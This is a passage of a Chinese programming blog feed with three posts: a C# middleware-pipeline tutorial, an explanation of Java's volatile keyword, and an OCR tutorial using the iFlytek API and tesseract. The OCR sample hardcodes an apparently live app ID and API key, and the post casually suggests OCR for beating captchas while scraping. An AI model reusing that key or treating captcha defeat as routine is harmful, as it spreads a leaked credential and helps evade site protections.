            Func&lt;/span&gt;&amp;lt;PipeLineDelegate&amp;lt;TContext&amp;gt;, PipeLineDelegate&amp;lt;TContext&amp;gt;&amp;gt; pipleDelegate = next =&amp;gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; context =&amp;gt;&lt;span&gt;
                {
                    action.Invoke(context);
                    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; next.Invoke(context);
                };
            };
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (index.HasValue)
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (index.Value &amp;gt;&lt;span&gt; _components.Count)
                    &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; Exception(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;插入索引超出目前管道大小&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
                &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                {
                    _components.Insert(index.Value, pipleDelegate);
                }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                _components.Add(next &lt;/span&gt;=&amp;gt;&lt;span&gt;
                {
                    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; context =&amp;gt;&lt;span&gt;
                    {
                        action.Invoke(context);
                        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; next.Invoke(context);
                    };
                });
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;可以看到，重载之后，传入的变成了Action&amp;lt;TContext&amp;gt; action，因为我想外部专注于自己要真正处理的业务，而调用下一个middleware的事情封装到方法内部，不用外部来关心了，并且，可以通过传入的index指定插入的中间件的位置，以此来控制业务的执行顺序。&lt;/p&gt;

&lt;p&gt;最后，需要把传入的委托链接起来，这就是管道的Build工作，代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; PipeLineDelegate&amp;lt;TContext&amp;gt;&lt;span&gt; Build()
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; requestDelegate = (PipeLineDelegate&amp;lt;TContext&amp;gt;)(context =&amp;gt;&lt;span&gt; Task.CompletedTask);

            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; func &lt;span&gt;in&lt;/span&gt;&lt;span&gt; _components.Reverse())
                requestDelegate &lt;/span&gt;=&lt;span&gt; func(requestDelegate);

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; requestDelegate;
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;到这里，管道相关的差不多说完了，那我，我如何利用上面的思想来处理我的业务呢？&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;处理业务&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://images2018.cnblogs.com/blog/1293736/201808/1293736-20180809231441683-520364023.png&quot;&gt;&lt;img title=&quot;项目管理流程&quot; src=&quot;https://images2018.cnblogs.com/blog/1293736/201808/1293736-20180809231442373-925810434.png&quot; alt=&quot;项目管理流程&quot; width=&quot;800&quot; height=&quot;838&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;处理示意图&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;步骤：&lt;/p&gt;
&lt;p&gt;Ø 初始化三条处理管道（根本是New三个List&amp;lt;Task&amp;gt;集合，对应前期准备工作集合，处理中工作的集合，扫尾工作的集合）。&lt;/p&gt;
&lt;p&gt;Ø 向三条管道中注入公共的处理任务。&lt;/p&gt;
&lt;p&gt;Ø 根据传入的流程类型动态加载对应的处理方法Handle()。&lt;/p&gt;
&lt;p&gt;Ø Handle方法向三条管道中注入该类型的流程所对应的特有任务。&lt;/p&gt;
&lt;p&gt;Ø Build三条管道。&lt;/p&gt;
&lt;p&gt;Ø 依此执行准备工作管道=&amp;gt;处理中管道=&amp;gt;处理后管道。&lt;/p&gt;
&lt;p&gt;上面步骤可以概括成下面的代码。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; InitApproveFlow(ApproveFlowInitContext context)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; beforePipeLineBuilder =&lt;span&gt; InitBeforePipeLine();
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; handlingPipeLineBuilder =&lt;span&gt; InitHandlingPipeLine();
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; afterPipeLineBuilder =&lt;span&gt; InitAfterPipeLine();

            RegisterEntityPipeLine(context.flowType, beforePipeLineBuilder, handlingPipeLineBuilder, afterPipeLineBuilder);

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; beforePipeLine =&lt;span&gt; beforePipeLineBuilder.Build();
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; handlingPipeLine =&lt;span&gt; handlingPipeLineBuilder.Build();
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; afterPipeLine =&lt;span&gt; afterPipeLineBuilder.Build();
            
            beforePipeLine.Invoke(context);
            handlingPipeLine.Invoke(context);
            afterPipeLine.Invoke(context);

        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中，RegisterEntityPipLine()方法根据flowType动态加载对应的类，所有类继承了一个公共的接口，接口暴露出了Handle方法。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; RegisterEntityPipeLine(&lt;span&gt;string&lt;/span&gt; flowType, IPipeLineBuilder&amp;lt;ApproveFlowInitContext&amp;gt;&lt;span&gt; beforePipeLineBuilder,
            IPipeLineBuilder&lt;/span&gt;&amp;lt;ApproveFlowInitContext&amp;gt;&lt;span&gt; handlingPipeLineBuilder,
            IPipeLineBuilder&lt;/span&gt;&amp;lt;ApproveFlowInitContext&amp;gt;&lt;span&gt; afterPipeLineBuilder)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; handleClassName = (&lt;span&gt;&quot;类名的前缀&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + flowType&lt;span&gt;).ToLower();
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; type =&lt;span&gt; AppDomain.CurrentDomain.GetAssemblies()
                .Where(a &lt;/span&gt;=&amp;gt; a.FullName.Contains(&lt;span&gt;&quot;程序及名称&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;))
                .SelectMany(a &lt;/span&gt;=&amp;gt;&lt;span&gt;
                    a.GetTypes().Where(t &lt;/span&gt;=&amp;gt;&lt;span&gt;
                        t.GetInterfaces().Contains(&lt;/span&gt;&lt;span&gt;typeof&lt;/span&gt;&lt;span&gt;(类继承的接口名称))
                    )
                ).FirstOrDefault(u &lt;/span&gt;=&amp;gt;&lt;span&gt;
                    u.FullName &lt;/span&gt;!= &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp; u.Name.ToLower() ==&lt;span&gt; handleClassName
                );

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (type == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; ObjectNotFoundException(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;未找到名称为[&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + handleClassName + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;]的类&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; handle =&lt;span&gt; (类继承的接口名称)_serviceProvider.GetService(type);
            handle.Handle(beforePipeLineBuilder, handlingPipeLineBuilder, afterPipeLineBuilder);
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Handle方法里面又做了什么呢？&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Handle(IPipeLineBuilder&amp;lt;ApproveFlowInitContext&amp;gt; beforePipeLineBuilder, IPipeLineBuilder&amp;lt;ApproveFlowInitContext&amp;gt; handlingPipeLineBuilder, IPipeLineBuilder&amp;lt;ApproveFlowInitContext&amp;gt;&lt;span&gt; afterPipeLineBuilder)
        {
            HandleBefore(beforePipeLineBuilder);
            Handling(handlingPipeLineBuilder);
            HandleAfter(afterPipeLineBuilder);
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;分别向三个管道中添加 前、中、后 对应的任务。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Q&amp;amp;A&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Q1:如果处理任务依赖于上一个处理任务的处理结果怎么办？&lt;/p&gt;
&lt;p&gt;PipeLineDelegate&amp;lt;TContext&amp;gt; 中的TContext是一个对象，可以向该对象中添加对应的属性，上游任务处理任务并对Context中的属性赋值，供下游的任务使用。&lt;/p&gt;
&lt;p&gt;Q2:如果某一个任务需要在其他任务之前执行怎么办（需要插队）？&lt;/p&gt;
&lt;p&gt;PipeLineBuilder.Use() 中，有Index参数，可以通过该参数，指定插入任务的位置。&lt;/p&gt;
&lt;p&gt;Q3:如果保证管道的通用性（不局限于某一业务）？&lt;/p&gt;
&lt;p&gt;TContext是泛型，可以不同的任务创建一个对应的TContext即可实现不同业务下的PipleLine的复用。&lt;/p&gt;

&lt;p&gt;有什么上面没涉及的问题欢迎大家在下方留言提问，谢谢。&lt;/p&gt;
</description>
<pubDate>Thu, 09 Aug 2018 15:15:00 +0000</pubDate>
<dc:creator>码农阿宇</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/CoderAyu/p/9452444.html</dc:identifier>
</item>
<item>
<title>java关键字 volatile的作用及使用说明 - 王若伊_恩赐解脱</title>
<link>http://www.cnblogs.com/jilodream/p/9452391.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jilodream/p/9452391.html</guid>
<description>&lt;p&gt;先来看看这个关键字是什么意思：&lt;br/&gt;volatile  [ˈvɒlətaɪl]&lt;br/&gt;adj. 易变的，不稳定的;&lt;br/&gt;从翻译上来看，volatile表示这个关键字是极易发生改变的。&lt;br/&gt;volatile是java语言中，最轻量级的并发同步机制。这个关键字有如下两个作用：&lt;br/&gt;1、任何对volatile变量的修改，java中的其他线程都可以感知到&lt;br/&gt;2、volatile会禁止指令冲排序优化&lt;br/&gt;　　在详细讲解volatile关键字之前，需要对java的内存模型有所理解，否则很难深入的认识到volatile的作用。java 内存可以像之前讲的那样，划分为堆、栈、方法区等等。但是从结合物理设备的角度来看，内存模型的布局设计如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/704073/201808/704073-20180809225322494-1351188186.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　之所以这样设计内存模型，是因为：相对于cpu的处理速度来说，物理内存的IO操作耗时非常严重。这就造成了cpu线程快速计算结束后，需要浪费大量的时间来等待内存IO的操作。为了减少这种等待，java内存模型引入了工作内存的概念。工作内存主要是利用cpu或内存的寄存器、高速缓存等部分进行数据缓冲，减少cpu线程在内存IO期间的等待。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;在java内存模型中，线程任何与数据有关的操作，都与并且只与工作内存相关。当线程需(防盗连接：本文首发自http://www.cnblogs.com/jilodream/ )要操作数据时，虚拟机会首先从主内存中读取数据，然后放置一份拷贝的数据到工作内存中。接着java线程读取工作内存中的拷贝数据，并操作得到一个全新的数据，然将将这个数据放回到工作内存中，覆盖原有的值。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　这样做可以充分利用物理硬件的优势：&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　(1)主内存，存储区域大，但是速度不行，适于存储，不适于快速读写&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　(2)工作内存、存储空间小，但是速度快，适于快速读写，不适于存储&lt;/span&gt;&lt;br/&gt;&lt;span&gt;同时还避免了Java线程读写主内存中数据同步问题。因为主内存对于各个Java线程都是可见的。如果java线程并发操作，就会导致主内存中的数据需要进行同步保护，否则就会出现错误的语义。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　但是这样做仍然会有一个问题：工作内存中的数据是拷贝数据。在Java线程操作的过程中，主内存中的数据可能已经发生改变，Java线程相当于是在用过时的值在计算和回写。这个问题就是数据称之为“同步”的含义所在，也是锁要处理的可见性的问题（以后有文章我会专门讲这个问题）。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;如何解决这个问题呢？&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　只能是通过“锁”的形式来处理。&lt;strong&gt;volatile关键字的作用之一，就是形成这样一个“锁”：&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　如果一个变量被定义了volatile，那么每次Java线程在写入这个变量时，都会加入一个“lock addl $Ox0&quot;的操作指令。这样会形成一个“内存屏障”，当cpu将这条指令写入到主内存时，会告诉其他存有这份指令的工作内存加一个标识。表示这个变量已经发生了变化，当前工作内存中存储的拷贝数据已经过时（这个过程被称之为内核CacheInvalidate)。当其他线程需要使用该变量来操作时，系统会因为这个标识判定当前工作内存中的数据已经过时。从而主动刷新主内存中的值到自己下边的工作内存中。由于在整个过程中，系统已经在线程操作数据之前，提前刷新了变量的值，所以线程无法看到已经过时的数据的。因此从表现上来看，可以认为是不存在数据不一致的问题。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　这里需要专门强调下long、double型。对于内存模型中定义的指令来说，操作的数据都是32位的。如果数据是64位，那么就需要两次指令操作。对于虚拟机中64位数据类型：double、long型，就会因为需要两次操作的时间差，导致其他线程拿到的是一种修改的中间值。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　但是volatile的内存屏障专门对这里进行了处理，以保证这种中间值不会出现在其他cpu的工作内存中。同时目前商业的虚拟机已经都对这个问题专门进行了处理：对64位数据的读写也采用原子操作。为的就是防止long double这两个常用类型，由于没有增加volatile关键字，而导致在工作内存中出现奇怪的值。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　&lt;strong&gt;volatile的另外一个作用是禁止指令重排序的优化&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　cpu线程在执行指令的过程中，为了保证速度更快，指令之间的顺序往往是通过优化重排序以后的顺序。为了保证重排序的指令不会有任何的歧义而仅仅是在速度上有所提升，系统会保证指令优化以后执行的结果是一致的。也就是你所获得的结果与没优化获得到的结果是一样的，不存在差异。但是由于指令顺序发生了变化，所以系统是无法保证这个过程中，其他的线程获取到的数据是能正确代表当前状态的。这里最经典的就是单例模式下，实例初始化的问题。请参见文章：设计模式之单例模式 的第3个方法。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;由于指令重排，系统会在变量没有初始化结束前，就已经给instance变量(防盗连接：本文首发自http://www.cnblogs.com/jilodream/ )赋予地址。这时候其他线程获取到的变量就是有问题的：instance!=null,但是里边的值却没有初始化完成。这里就需要使用volatile关键字禁止指令重排序：只有在实例初始化完毕后，才赋予变量instance引用。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　另外一个常见的例子是：&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　线程B在刷新线程A的处理结果时，可能由于线程A还没有对变量初始化完毕，却提前刷新了变量，导致了线程B所获取到的变量的状态是错误的。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;因此在定义多线程可见变量时，前边一定要加volatile关键字，保证该变量不会被因为指令顺序被优化，而导致其他线程获取到的值是无意义的。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;关于Java语言的有序性在《深入理解Java虚拟机》中有一句话，总结的非常好：如果在本线程内观察，所有的操作都是有序的。如果在一个其它线程观察本线程，则所有的操作都是无序的。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　前边是指，无论虚拟机怎么优化指令，当前线程在执行的语义和结果上都应该是一致的。（“线程内表现为串行的语义&quot;Within-Thread-As-If-Serial-Semantics)。后边是指指令会发生重排，其它线程中获取到的值，不能代表什么。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;其实volatile的这两个作用是互相关联的：&lt;strong&gt;正是由于volatile需要保证变量的可见性，因此不能将系统无序的中间指令结果反映到主内存中，让其它线程拿去使用可见，所以需要禁止掉指令重排序。保证拿到的结果是反映出当前的执行状态的。&lt;/strong&gt;（这里涉及到一个happens-before原则的概念，我会在后边的文章中介绍）&lt;/span&gt;&lt;br/&gt;&lt;span&gt;volatile存在的问题&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　说了volatile的两个作用，volatile也有自身的不足。那就是volatile不能保证原子性：&lt;/span&gt;&lt;br/&gt;&lt;span&gt;举个前文讲过的例子，volatile变量值被修改以后，会直接刷新到主内存中，并且其他线程能感知到。但是其他线程继续使用这个变量进行计算时，却不能保证其一直是最新的值。举个经典例子&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;volatile&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; a=0&lt;span&gt;；
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; add()
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;     a++&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;　　两个线程t1，t2先后执行add)方法，变量a发生了自增。但是a变量的最终结果可能是1也可能是2。这取决于t2读取变量a的值是在第一个线程刷新a到主内存之前，还是主内存之后。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;a++操作最终在执行时，会执行三条指令:&lt;/span&gt;&lt;br/&gt;&lt;span&gt;1、从主内存中读取a值&lt;/span&gt;&lt;br/&gt;&lt;span&gt;2、a=a+1&lt;/span&gt;&lt;br/&gt;&lt;span&gt;3、写入a的值到主内存中&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　当t1执行完第二步时，假如此时t2也读取了a的值，则：主内存a=0；t1工作内存为a=1；t2工作内存为a=0；接下来t1执行回写a操作，但是t2由于已经读取了a的值在工作内存中，因此t2在执行了a++操作后，仍然会回写a=1到主内存中，这时尽管t1回写后，生成内存屏障，但是t2已经读取完毕，不会在自增阶段再主动刷新。(防盗连接：本文首发自http://www.cnblogs.com/jilodream/ )否则如果需要执行连续的多条指令，每次都要主动刷新变量，一旦发生变化就重头开始，这显然是不可能的。这种情况就需要程序员通过代码自己来保证没有问题。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;这里我们可以发现a变量不会因为volatile关键字，而使得自身的指令在外界看来是原子的。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;因此volatile的使用存在如下限制场景：&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;　　1、volatile可以写入，但是写入的值不应该依赖旧值&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;　　2、在确认某个状态的不变性时，不能将volatile变量作为因子。&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;　　这两点在《java并发编程实战》、《深入理解java虚拟机》中都有提到类似的语义。第一点比较容易理解。第二点比较抽象，这里解释一下：就是说volatile适合于判断是否已经改变了，而不适合判断是否还没改变，因为volatile变量发生改变，则一定发生了变化，volatile没有发生变化，则不能说明一定没有发生变化。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;如前文，a如果仍然等于0.此时不能认为：1、add方法没有被调用过2、整体没有被改变过。&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 09 Aug 2018 14:59:00 +0000</pubDate>
<dc:creator>王若伊_恩赐解脱</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/jilodream/p/9452391.html</dc:identifier>
</item>
<item>
<title>我的AI之路 —— OCR文字识别快速体验版 - xingoo</title>
<link>http://www.cnblogs.com/xing901022/p/9452335.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xing901022/p/9452335.html</guid>
<description>&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;OCR的全称是Optical Character Recoginition，光学字符识别技术。目前应用于各个领域方向，甚至这些应用就在我们的身边，比如身份证的识别、交通路牌的识别、车牌的自动识别等等。本篇就先讲一下基于开源软件和大厂服务的文字识别效果，后续会陆续讲解一下机器学习和深度学习实现的方案和原理，敬请期待吧。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;还记得前一阵某小盆友拿过来一个全是图片的ppt，让我把里面的文字给抠出来(我当时很震惊!!!)，随后在网上随便找了个OCR的在线文档转换软件，就给转过来了——这里面用到的技术就是OCR文字识别，所以本篇就带大家宏观上了解一下文字识别的技术方案与实现过程。&lt;/p&gt;
&lt;p&gt;更多内容参考——&lt;a href=&quot;https://www.cnblogs.com/xing901022/p/9150180.html&quot;&gt;我的AI之路&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;有需求的地方就有市场，文字识别也不例外，很多大厂都提供了对应的服务，按照调用次数进行收费。比如网上找了一个产品服务的定价&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223110732-1750320141.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，倘若你的服务只是偶尔用一次，完全可以使用这种体验型的免费服务。如果一天需要调用一万次，那么一个月基本的花费在5w左右——成本还是很高的，所以很多商用的场景大多都采用自主研发的方式来做。&lt;/p&gt;
&lt;p&gt;如果使用这种大厂（我这里使用的讯飞），流程基本如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223135659-1537786036.png&quot;/&gt;&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;#!/usr/bin/python
# -*- coding: UTF-8 -*-
import time
from urllib import request,parse
import json
import hashlib
import base64
import cv2


url = 'http://webapi.xfyun.cn/v1/service/v1/ocr/general'
x_appid = '5b4d9bbf'
api_key = 'a08332353b4df650842359129ffadb88'
param = {&quot;language&quot;: &quot;cn|en&quot;, &quot;location&quot;: &quot;true&quot;}
x_param = str(base64.b64encode(bytes(json.dumps(param).replace(' ', ''),encoding='utf-8')),encoding = &quot;utf8&quot;)

dict = {}

def main():
    # 图片加载
    f = open(&quot;名片.jpg&quot;, 'rb')
    file_content = f.read()
    body = parse.urlencode({'image': base64.b64encode(file_content)})

    x_time = int(int(round(time.time() * 1000)) / 1000)
    x_checksum = hashlib.md5((api_key + str(x_time) + x_param).encode(&quot;utf8&quot;)).hexdigest()

    x_header = {
        'X-Appid': x_appid,
        'X-CurTime': x_time,
        'X-Param': x_param,
        'X-CheckSum': x_checksum
    }

    req = request.Request(url, data=body.encode(&quot;utf-8&quot;), headers=x_header)
    result = request.urlopen(req).read()

    body = json.loads(result, encoding='utf-8')

    img = cv2.imread('名片.jpg')
    for text_line in body['data']['block'][0]['line']:
        word = text_line['word'][0]
        x1 = word['location']['top_left']['x']
        y1 = word['location']['top_left']['y']
        x2 = word['location']['right_bottom']['x']
        y2 = word['location']['right_bottom']['y']

        # 绘制文本框
        cv2.line(img, (x1, y1), (x2, y1), (255, 0, 0), 2)
        cv2.line(img, (x1, y1), (x1, y2), (255, 0, 0), 2)
        cv2.line(img, (x1, y2), (x2, y2), (255, 0, 0), 2)
        cv2.line(img, (x2, y1), (x2, y2), (255, 0, 0), 2)

        # 输出对应文本
        text = word['content']
        print(text)

    cv2.imshow('result', img)
    cv2.waitKey(0)

if __name__ == '__main__':
    main()&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223206180-436817116.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;有的时候我们在写爬虫会遇到验证码校验的问题，这个时候使用大厂的接口就不现实了。验证码一般是数字+字母，因此识别起来复杂度不高，采用一些开源软件就能应付。说到开源软件，最有名的就是tesseract了，它目前由Google在进行维护，官方提供了3.05版本，貌似使用的还是传统机器学习的方式。&lt;/p&gt;
&lt;h2 id=&quot;安装&quot;&gt;安装&lt;/h2&gt;
&lt;p&gt;安装的过程很简单，以我的mac为例，如果你只是想体验一下，那么可以使用下面的命令安装：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;brew install tesseract&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果还想未来针对自己的使用数据重新训练，可以使用下面的命令安装(强烈推荐)：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;brew install --with-training-tools tesseract&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果不介意时间长一点，可以直接安装的时候下载所有的语言版本（不建议，因为语言包真的很大）：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;brew install --all-languages --with-training-tools tesseract&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后配置环境变量，比如&lt;code&gt;vi ~/.bash_profile&lt;/code&gt; 增加下面的内容：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;# 增加tesseract环境变量
export TESSERACT=/usr/local/Cellar/tesseract/3.05.02
export TESSDATA_PREFIX=/usr/local/Cellar/tesseract/3.05.02/share/
export PATH=$PATH:$TESSERACT/bin&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后执行&lt;code&gt;source ~/.bash_profile&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在命令行就可以使用tesseract了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223430933-397887177.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;支持中文版本&quot;&gt;支持中文版本&lt;/h2&gt;
&lt;p&gt;如果想要支持中文，官方提供了语言包，可以去直接下载：&lt;br/&gt;&lt;a href=&quot;https://github.com/tesseract-ocr/tesseract/wiki/Data-Files#data-files-for-version-304305&quot; class=&quot;uri&quot;&gt;https://github.com/tesseract-ocr/tesseract/wiki/Data-Files#data-files-for-version-304305&lt;/a&gt;&lt;br/&gt;这里3.04和3.05是通用的，下载后使用-l命令切换语言版本即可。&lt;/p&gt;
&lt;p&gt;下面体验一下tesseract的效果，原图为&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223506729-1926160069.png&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223516283-1999278279.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;正常在使用tesseract的时候都会基于第三方的易用的接口来用&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223535730-1189309966.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;tesseract的自定义语言训练&quot;&gt;tesseract的自定义语言训练&lt;/h2&gt;
&lt;p&gt;另外tesseract对中文的支持还不是很好，如果想要优化可以使用jTessBoxEditor。&lt;br/&gt;&lt;a href=&quot;http://www.softpedia.com/get/Multimedia/Graphic/Graphic-Others/jTessBoxEditor.shtml&quot; class=&quot;uri&quot;&gt;http://www.softpedia.com/get/Multimedia/Graphic/Graphic-Others/jTessBoxEditor.shtml&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;重新训练的流程为：&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223554976-1705955984.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;首先需要把图片转成tiff格式，这样它才能记录一些box的信息。&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223610947-172953490.png&quot;/&gt;&lt;br/&gt;然后打开JTessBoxEditor对图片进行合并：&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223626667-637816553.png&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223640919-2027786587.png&quot;/&gt;&lt;br/&gt;合并后得到一个新的tif图片&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/449064/201808/449064-20180809223659274-14108288.png&quot;/&gt;&lt;br/&gt;然后基于tesseract打上box信息&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;tesseract tg.font.exp0.tif tg.font.exp0 -l chi_sim batch.nochop makebox&lt;/code&gt;
&lt;/pre&gt;
